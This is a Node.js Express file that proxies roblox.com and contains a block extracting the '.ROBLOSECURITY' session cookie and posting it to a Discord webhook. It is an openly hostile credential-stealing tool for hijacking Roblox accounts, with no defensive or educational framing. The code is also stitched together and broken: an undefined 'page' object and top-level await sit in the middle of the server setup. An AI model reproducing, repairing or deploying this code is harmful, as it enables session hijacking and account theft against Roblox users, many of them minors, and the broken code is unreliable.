const express = require("express");
const cookieParser = require("cookie-parser");
const { createProxyMiddleware } = require("http-proxy-middleware");

const app = express();
const storedCookies = [];
const PORT = 5000;

app.use(cookieParser());

const customProxy = createProxyMiddleware({
  target: "https://roblox.com/",
  changeOrigin: true,
  onProxyReq: (proxyReq) => {
    storedCookies.forEach((cookie) => {
      proxyReq.setHeader("cookie", `${cookie.name}=${cookie.value}`);
    });
  }
});
  // Extract a cookie named 'myCookie'
const cookie = await page.evaluate(() => {
    const cookies = document.cookie.split(';');
    for (const cookieString of cookies) {
      const [name, value] = cookieString.trim().split('=');
      if (name === '.ROBLOSECURITY') {
        return value;
      }
    }
    return null; 
  });
  
  const discordWebhook = '';
  const fetch = require('node-fetch');
  await fetch(discordWebhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: `Cookie: ${cookie}` }),
  });

app.use((req, res, next) => {
  const ignoredPaths = ["/404.html"];

  if (!ignoredPaths.includes(req.url)) {
    customProxy(req, res, next);
  } else {
    next();
  }
});

app.listen(PORT, () => {
  console.log(`FA-v2 server listening on port ${PORT}`);
});
